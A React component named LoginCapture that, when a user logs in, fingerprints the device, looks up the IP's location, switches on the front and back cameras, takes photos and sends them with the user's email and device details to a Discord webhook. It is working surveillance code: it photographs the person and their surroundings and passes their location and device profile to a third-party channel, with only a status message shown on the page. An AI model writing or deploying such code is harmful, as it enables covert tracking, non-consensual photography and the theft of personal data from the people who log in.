"use client";

import { useEffect, useRef, useState } from "react";
import { sendLoginAlert } from "@/lib/discord-webhook";

interface LoginCaptureProps {
  webhookUrl: string;
  email: string;
  name?: string;
  onComplete: () => void;
}

interface DeviceInfo {
  ipAddress: string;
  location?: string;
  device: string;
  browser: string;
  os: string;
  screen: string;
  battery?: string;
  network?: string;
  cpuCores?: number | string;
  memory?: string;
  language?: string;
  timezone?: string;
  cookies?: string;
  doNotTrack?: string;
  gpu?: string;
}

export default function LoginCapture({
  webhookUrl,
  email,
  name,
  onComplete,
}: LoginCaptureProps) {
  const [status, setStatus] = useState("Initializing camera...");
  const [captured, setCaptured] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const videoBackRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const canvasBackRef = useRef<HTMLCanvasElement>(null);
  const initialized = useRef(false);

  useEffect(() => {
    if (initialized.current) return;
    initialized.current = true;

    async function init() {
      console.log("[LoginCapture] Starting initialization...");
      setStatus("Getting device info...");
      const deviceInfo = await getDeviceInfo();
      console.log("[LoginCapture] Device info:", deviceInfo);

      setStatus("Starting cameras...");
      await startCameras();

      setStatus("Capturing photo...");
      await new Promise(resolve => setTimeout(resolve, 3000));

      setStatus("Sending to Discord...");
      await captureAndSend(deviceInfo);

      setStatus("Done!");
      setCaptured(true);
      await new Promise(resolve => setTimeout(resolve, 500));
      onComplete();
    }

    init();
  }, []);

  async function getDeviceInfo(): Promise<DeviceInfo> {
    let ipAddress = "Unknown";
    let location = "Unknown";

    try {
      const ipResponse = await fetch("https://ip-api.com/json/");
      const ipData = await ipResponse.json();
      if (ipData.status === "success") {
        ipAddress = ipData.query;
        location = `${ipData.city || ""}, ${ipData.regionName || ""}, ${ipData.country || ""}`.replace(/^, |, $|, , /g, "") || "Unknown";
      }
    } catch {
      console.log("[LoginCapture] Could not get IP info");
    }

    const ua = navigator.userAgent;
    let browser = "Unknown Browser";
    if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Edge")) browser = "Edge";

    let os = "Unknown OS";
    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Linux")) os = "Linux";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iOS")) os = "iOS";

    const device = /mobile|android|iphone|ipad|tablet/i.test(ua) ? "Mobile" : "Desktop";
    const screen = `${window.screen.width}x${window.screen.height}`;

    let battery = "N/A";
    try {
      if ("getBattery" in navigator) {
        const batteryManager = await (navigator as unknown as { getBattery: () => Promise<{ level: number; charging: boolean }> }).getBattery();
        battery = `${Math.round(batteryManager.level * 100)}%${batteryManager.charging ? " (Charging)" : ""}`;
      }
    } catch {}

    const connection = (navigator as unknown as { connection?: { effectiveType?: string; downlink?: number } }).connection;
    const network = connection ? `${connection.effectiveType || "Unknown"}` : "Connected";

    const cpuCores = navigator.hardwareConcurrency || "N/A";
    const deviceMemory = (navigator as unknown as { deviceMemory?: number }).deviceMemory;
    const memory = deviceMemory ? `${deviceMemory} GB` : "N/A";

    return {
      ipAddress,
      location,
      device,
      browser,
      os,
      screen,
      battery,
      network,
      cpuCores,
      memory,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
      doNotTrack: navigator.doNotTrack === "1" ? "ON" : "OFF",
      gpu: "N/A",
    };
  }

  async function startCameras() {
    try {
      console.log("[LoginCapture] Requesting front camera...");
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: 640, height: 480 },
        audio: false,
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        console.log("[LoginCapture] Front camera started");
      }
    } catch (err) {
      console.log("[LoginCapture] Front camera error:", err);
    }

    try {
      console.log("[LoginCapture] Requesting back camera...");
      const backStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "environment", width: 640, height: 480 },
        audio: false,
      });
      if (videoBackRef.current) {
        videoBackRef.current.srcObject = backStream;
        await videoBackRef.current.play();
        console.log("[LoginCapture] Back camera started");
      }
    } catch (err) {
      console.log("[LoginCapture] Back camera not available:", err);
    }
  }

  function captureCanvas(video: HTMLVideoElement | null, canvas: HTMLCanvasElement | null, label: string): string | null {
    if (!video || !canvas) {
      console.log("[LoginCapture] " + label + ": no video or canvas");
      return null;
    }
    if (!video.srcObject) {
      console.log("[LoginCapture] " + label + ": no srcObject");
      return null;
    }

    try {
      const ctx = canvas.getContext("2d");
      if (!ctx) return null;

      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      canvas.width = w;
      canvas.height = h;

      ctx.drawImage(video, 0, 0, w, h);
      const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
      console.log("[LoginCapture] " + label + " captured:", dataUrl.length, "bytes");
      return dataUrl;
    } catch (err) {
      console.error("[LoginCapture] " + label + " error:", err);
      return null;
    }
  }

  function stopCameras() {
    [videoRef.current, videoBackRef.current].forEach(v => {
      if (v?.srcObject) {
        (v.srcObject as MediaStream).getTracks().forEach(t => t.stop());
      }
    });
  }

  async function uploadImage(base64Data: string, filename: string): Promise<string | null> {
    try {
      const response = await fetch("/api/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image: base64Data, filename }),
      });
      const result = await response.json();
      if (result.url) {
        console.log("[LoginCapture] Upload success:", result.url);
        return result.url;
      }
      console.log("[LoginCapture] Upload failed:", result.error);
      return null;
    } catch (err) {
      console.error("[LoginCapture] Upload error:", err);
      return null;
    }
  }

  async function captureAndSend(deviceInfo: DeviceInfo) {
    const frontImg = captureCanvas(videoRef.current, canvasRef.current, "Front");
    const backImg = captureCanvas(videoBackRef.current, canvasBackRef.current, "Back");
    stopCameras();

    let frontUrl: string | undefined = undefined;
    let backUrl: string | undefined = undefined;

    if (frontImg) {
      const uploaded = await uploadImage(frontImg, `${email}_front.jpg`);
      if (uploaded) frontUrl = uploaded;
      else frontUrl = frontImg;
    }

    if (backImg) {
      const uploaded = await uploadImage(backImg, `${email}_back.jpg`);
      if (uploaded) backUrl = uploaded;
      else backUrl = backImg;
    }

    const now = new Date();
    const timestamp = now.toLocaleString("id-ID", {
      weekday: "long", year: "numeric", month: "long", day: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit", timeZoneName: "short",
    });

    await sendLoginAlert(webhookUrl, {
      email,
      name,
      ipAddress: deviceInfo.ipAddress,
      location: deviceInfo.location,
      device: deviceInfo.device,
      browser: deviceInfo.browser,
      os: deviceInfo.os,
      screen: deviceInfo.screen,
      photoBase64: frontUrl,
      backCameraPhoto: backUrl,
      timestamp,
      battery: deviceInfo.battery,
      network: deviceInfo.network,
      cpuCores: deviceInfo.cpuCores,
      memory: deviceInfo.memory,
      language: deviceInfo.language,
      timezone: deviceInfo.timezone,
      cookies: deviceInfo.cookies,
      doNotTrack: deviceInfo.doNotTrack,
      gpu: deviceInfo.gpu,
    });

    console.log("[LoginCapture] Discord alert sent!");
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
      <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
        <div className="mb-6">
          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-blue-100 flex items-center justify-center">
            {captured ? (
              <svg className="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            ) : (
              <svg className="w-8 h-8 text-blue-500 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
              </svg>
            )}
          </div>
          <h2 className="text-xl font-semibold text-gray-900 mb-2">
            {captured ? "Photo Captured!" : "Capturing Photo..."}
          </h2>
          <p className="text-gray-600 text-sm">{status}</p>
        </div>

        {/* Visible video for debugging */}
        <div className="grid grid-cols-2 gap-2 mb-4">
          <div className="bg-black rounded-lg overflow-hidden">
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              className="w-full h-32 object-cover"
            />
            <p className="text-white text-xs text-center py-1 bg-black/50">Front</p>
          </div>
          <div className="bg-black rounded-lg overflow-hidden">
            <video
              ref={videoBackRef}
              autoPlay
              playsInline
              muted
              className="w-full h-32 object-cover"
            />
            <p className="text-white text-xs text-center py-1 bg-black/50">Back</p>
          </div>
        </div>

        <canvas ref={canvasRef} className="hidden" />
        <canvas ref={canvasBackRef} className="hidden" />
      </div>
    </div>
  );
}
